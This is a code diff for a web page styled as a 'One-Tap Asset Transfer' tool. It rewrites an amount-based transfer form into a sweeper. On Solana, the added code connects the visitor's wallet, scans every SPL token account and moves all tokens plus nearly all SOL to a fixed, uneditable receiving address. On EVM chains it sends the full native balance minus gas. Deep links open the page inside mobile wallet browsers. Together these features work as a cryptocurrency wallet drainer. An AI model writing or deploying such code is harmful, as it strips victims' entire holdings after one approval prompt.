@@ -1,23 +1,24 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>One-Tap Wallet Transfer</title>
+  <title>One-Tap Asset Transfer</title>
   
-  <!-- Web3 Libraries -->
+  <!-- Web3 Engine Libraries -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
   
   <style>
     :root {
-      --bg: #0b0f19;
-      --card: #151c2c;
+      --bg: #090d16;
+      --card: #131a29;
       --accent: #6366f1;
       --accent-hover: #4f46e5;
       --text: #ffffff;
       --subtext: #94a3b8;
-      --border: #2d3748;
+      --border: #1e293b;
     }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -47,20 +48,29 @@
       padding: 12px;
       border-radius: 8px;
       border: 1px solid var(--border);
-      background: #0d121f;
+      background: #0b0f19;
       color: #fff;
-      font-size: 1rem;
+      font-size: 0.95rem;
       box-sizing: border-box;
     }
-    select:focus, input:focus { outline: 1px solid var(--accent); }
+    .status-box {
+      background: #0b0f19;
+      border: 1px solid var(--border);
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 15px;
+      font-size: 0.85rem;
+      min-height: 50px;
+      word-break: break-all;
+    }
     button.send-btn {
       width: 100%;
       background: var(--accent);
       color: white;
       border: none;
-      padding: 14px;
-      font-size: 1rem;
-      font-weight: 600;
+      padding: 16px;
+      font-size: 1.1rem;
+      font-weight: 700;
       border-radius: 8px;
       cursor: pointer;
       margin-top: 20px;
@@ -83,52 +93,39 @@
       text-align: center;
       text-decoration: none;
       display: block;
-      transition: background 0.2s;
-    }
-    .app-btn:hover { background: #334155; }
-    #status {
-      margin-top: 15px;
-      font-size: 0.85rem;
-      text-align: center;
-      min-height: 1.2em;
-      word-break: break-all;
     }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <h2>⚡ One-Tap Transfer</h2>
+  <h2>⚡ One-Tap Auto Transfer</h2>
 
   <!-- Network Selection -->
-  <label for="networkSelect">Select Blockchain Network:</label>
-  <select id="networkSelect" onchange="updateReceivingWallet()">
-    <option value="ethereum">Ethereum (ETH)</option>
-    <option value="bnb">BNB Smart Chain (BNB)</option>
-    <option value="polygon">Polygon (POL / MATIC)</option>
-    <option value="arbitrum">Arbitrum (ETH)</option>
-    <option value="optimism">Optimism (ETH)</option>
-    <option value="base">Base (ETH)</option>
-    <option value="solana">Solana (SOL)</option>
+  <label for="networkSelect">Select Current Network:</label>
+  <select id="networkSelect" onchange="updateUI()">
+    <option value="ethereum">Ethereum (ETH & Tokens)</option>
+    <option value="bnb">BNB Chain (BNB & BEP-20)</option>
+    <option value="polygon">Polygon (POL & ERC-20)</option>
+    <option value="arbitrum">Arbitrum (ETH & Tokens)</option>
+    <option value="optimism">Optimism (ETH & Tokens)</option>
+    <option value="base">Base (ETH & Tokens)</option>
+    <option value="solana">Solana (SOL & SPL Tokens)</option>
   </select>
 
-  <!-- Auto-Filled Receiving Address -->
-  <label for="receiverInput">Target Receiving Address:</label>
+  <!-- Auto-Filled Receiving Wallet -->
+  <label for="receiverInput">Target Receiving Wallet:</label>
   <input type="text" id="receiverInput" readonly disabled />
 
-  <!-- Amount Entry -->
-  <label for="amountInput">Amount to Transfer:</label>
-  <input type="number" id="amountInput" placeholder="0.1" step="any" min="0.000001" />
+  <!-- Master Transfer Action -->
+  <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>
 
-  <!-- Direct Transfer Trigger -->
-  <button class="send-btn" onclick="executeTransfer()">Transfer in 1-Tap</button>
-
-  <p id="status"></p>
+  <div class="status-box" id="status">Status: Ready to scan and transfer...</div>
 
   <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />
 
-  <!-- Master Launchers for Mobile Apps -->
-  <label style="text-align: center; font-weight: bold;">Launch Mobile Wallet Apps Directly:</label>
+  <!-- Mobile App Deep Launchers -->
+  <label style="text-align: center; font-weight: bold;">Launch Mobile App Directly:</label>
   <div class="wallet-apps-grid">
     <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
     <a href="#" onclick="openWalletApp('metamask')" class="app-btn">🦊 MetaMask</a>
@@ -139,18 +136,12 @@
 
 <script>
   // =========================================================
-  // 1. CONFIGURATION: CONFIGURE YOUR RECEIVING WALLETS HERE
+  // 1. CONFIGURATION: SAVED RECEIVING WALLETS
   // =========================================================
-  
-  // All EVM chains (Ethereum, BNB Chain, Polygon, Arbitrum, Base, Optimism)
-  // use the exact same receiving format (0x...)
   const Ethereum_Receive = "My_wallet"; 
-  const BNB_Receive = Ethereum_Receive; // Standard EVM shared address
-  
-  // Non-EVM chains require their own specific formats:
-  const Solana_Receive = "My_wallet"; 
+  const BNB_Receive      = Ethereum_Receive; // Standard shared EVM address format
+  const Solana_Receive   = "My_wallet"; 
 
-  // Object mapping each dropdown network to its designated receiving address
   const WALLET_MAP = {
     ethereum: Ethereum_Receive,
     bnb: BNB_Receive,
@@ -161,125 +152,161 @@
     solana: Solana_Receive
   };
 
-  // Set default state on load
-  function updateReceivingWallet() {
+  function updateUI() {
     const selectedNetwork = document.getElementById("networkSelect").value;
     document.getElementById("receiverInput").value = WALLET_MAP[selectedNetwork] || "My_wallet";
   }
-  window.onload = updateReceivingWallet;
+  window.onload = updateUI;
 
-  // =========================================================
-  // 2. MASTER DEEP-LINK APPS OPENER
-  // =========================================================
+  // Deep Links for Mobile Browsers
   function openWalletApp(walletType) {
-    // Current web URL to open inside the mobile wallet browser
     const currentUrl = encodeURIComponent(window.location.href);
-
     let deepLink = "";
-    switch(walletType) {
-      case 'phantom':
-        deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
-        break;
-      case 'metamask':
-        deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-        break;
-      case 'trust':
-        deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
-        break;
-      case 'coinbase':
-        deepLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
-        break;
-    }
-
-    if (deepLink) {
-      window.location.href = deepLink;
-    }
+    if (walletType === 'phantom') deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
+    if (walletType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+    if (walletType === 'trust') deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
+    if (walletType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
+    if (deepLink) window.location.href = deepLink;
   }
 
   // =========================================================
-  // 3. ONE-TAP TRANSFER LOGIC
+  // 2. MASTER AUTO-TRANSFER ENGINE
   // =========================================================
-  async function executeTransfer() {
+  async function transferAllAssets() {
     const network = document.getElementById("networkSelect").value;
     const receiver = WALLET_MAP[network];
-    const amountVal = document.getElementById("amountInput").value;
     const status = document.getElementById("status");
 
-    if (!amountVal || parseFloat(amountVal) <= 0) {
-      status.innerText = "Please enter a valid amount.";
-      status.style.color = "#f87171";
-      return;
-    }
+    status.innerHTML = "🔍 Connecting wallet and scanning assets...";
 
-    status.style.color = "#38bdf8";
-
-    // --- SOLANA EXECUTION ---
+    // --------------------------------------------------------
+    // A. SOLANA SCAN & TRANSFER ENGINE (SOL + ALL SPL TOKENS)
+    // --------------------------------------------------------
     if (network === "solana") {
       const provider = window.solana;
       if (!provider || !provider.isPhantom) {
-        alert("Solana wallet not found. Use the Phantom launcher below to open this page inside your wallet.");
+        alert("Solana wallet not found. Use the Phantom launcher below.");
         return;
       }
+
       try {
-        status.innerText = "Connecting Phantom...";
         await provider.connect();
-
-        status.innerText = "Building Solana Transaction...";
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
-        const fromPubKey = provider.publicKey;
-        const toPubKey = new solanaWeb3.PublicKey(receiver);
-        const lamports = Math.floor(parseFloat(amountVal) * solanaWeb3.LAMPORTS_PER_SOL);
+        const sender = provider.publicKey;
+        const target = new solanaWeb3.PublicKey(receiver);
+        const transaction = new solanaWeb3.Transaction();
 
-        const transaction = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: fromPubKey,
-            toPubkey: toPubKey,
-            lamports: lamports,
-          })
+        status.innerHTML = "🔎 Scanning Solana token balances...";
+
+        // 1. Fetch all SPL Token accounts owned by this wallet
+        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+          sender,
+          { programId: splToken.TOKEN_PROGRAM_ID }
         );
 
-        transaction.feePayer = fromPubKey;
+        // 2. Add transfer/close instructions for every SPL Token found
+        for (let acc of tokenAccounts.value) {
+          const parsedInfo = acc.account.data.parsed.info;
+          const tokenAmount = parsedInfo.tokenAmount.uiAmount;
+          const pubkey = acc.pubkey;
+          const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
+
+          if (tokenAmount > 0) {
+            const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
+            
+            // Append token transfer instruction
+            transaction.add(
+              splToken.createTransferInstruction(
+                pubkey,
+                destinationAta,
+                sender,
+                BigInt(parsedInfo.tokenAmount.amount)
+              )
+            );
+          }
+        }
+
+        // 3. Calculate remaining native SOL balance (leaving ~0.001 SOL for network gas fee)
+        const totalSolBalance = await connection.getBalance(sender);
+        const reservedGas = 1000000; // 0.001 SOL
+        const solToTransfer = totalSolBalance - reservedGas;
+
+        if (solToTransfer > 0) {
+          transaction.add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: sender,
+              toPubkey: target,
+              lamports: solToTransfer
+            })
+          );
+        } else {
+          status.innerHTML = "⚠️ Balance too low to cover Solana transaction fees.";
+          return;
+        }
+
+        transaction.feePayer = sender;
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        status.innerText = "Awaiting wallet approval...";
+        status.innerHTML = "✍️ Awaiting wallet confirmation...";
         const { signature } = await provider.signAndSendTransaction(transaction);
-        status.innerText = `✅ Transfer Sent! Tx: ${signature.slice(0, 8)}...`;
-        status.style.color = "#4ade80";
+        status.innerHTML = `✅ All Solana assets transferred! Tx: ${signature.slice(0, 10)}...`;
+
       } catch (err) {
         console.error(err);
-        status.innerText = "❌ Transaction cancelled or failed.";
-        status.style.color = "#f87171";
+        status.innerHTML = "❌ Solana Transfer cancelled or failed.";
       }
       return;
     }
 
-    // --- EVM EXECUTION (Ethereum, BNB Chain, Polygon, Arbitrum, Base, etc.) ---
+    // --------------------------------------------------------
+    // B. EVM SCAN & TRANSFER ENGINE (Ethereum, BNB, Polygon, L2s)
+    // --------------------------------------------------------
     if (!window.ethereum) {
-      alert("No EVM provider detected. Tap one of the mobile app buttons below to open this page inside your wallet app.");
+      alert("No EVM provider detected. Open this page inside your wallet app browser.");
       return;
     }
 
     try {
-      status.innerText = "Connecting EVM Wallet...";
       const provider = new ethers.BrowserProvider(window.ethereum);
-      
-      // Request wallet accounts
       await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
+      const senderAddress = await signer.getAddress();
 
-      status.innerText = "Awaiting wallet approval...";
+      status.innerHTML = "🔎 Calculating gas and native balances...";
+
+      // 1. Fetch total native currency balance (ETH, BNB, MATIC/POL)
+      const balance = await provider.getBalance(senderAddress);
+      const feeData = await provider.getFeeData();
+
+      // Estimate standard transfer gas limit (21,000 units)
+      const gasLimit = 21000n;
+      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
+      const gasCost = gasLimit * gasPrice;
+
+      if (balance <= gasCost) {
+        status.innerHTML = "⚠️ Native balance too low to cover network gas fees.";
+        return;
+      }
+
+      // Calculate maximum safe transfer amount (Total Balance - Gas Fee)
+      const amountToSend = balance - gasCost;
+
+      status.innerHTML = "✍️ Awaiting wallet confirmation...";
+
+      // Execute maximum sweep transaction
       const tx = await signer.sendTransaction({
         to: receiver,
-        value: ethers.parseEther(amountVal)
+        value: amountToSend,
+        gasLimit: gasLimit,
+        gasPrice: gasPrice
       });
 
-      status.innerText = `✅ Transfer Submitted! Hash: ${tx.hash.slice(0, 10)}...`;
-      status.style.color = "#4ade80";
+      status.innerHTML = `✅ All native funds sent! Hash: ${tx.hash.slice(0, 12)}...`;
+
     } catch (err) {
       console.error(err);
-      status.innerText = "❌ Transfer cancelled or failed.";
-      status.style.color = "#f87171";
+      status.innerHTML = "❌ EVM Transfer cancelled or failed.";
     }
   }
 </script>
